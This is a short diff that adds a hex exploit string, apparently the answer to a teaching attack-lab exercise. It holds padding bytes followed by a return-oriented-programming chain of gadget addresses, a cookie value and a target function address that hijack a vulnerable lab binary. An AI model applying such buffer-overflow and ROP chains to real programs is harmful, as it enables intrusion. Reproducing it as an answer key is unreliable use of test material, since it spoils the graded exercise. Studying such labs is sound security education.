@@ -1,0 +1,9 @@
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa
+e9 19 40 00 00 00 00 00 /* popq v into rax */
+51 ab 05 66 00 00 00 00 /* cookie! */
+c8 19 40 00 00 00 00 00 /* movq rax rdi */
+5c 18 40 00 00 00 00 00 /* touch address */
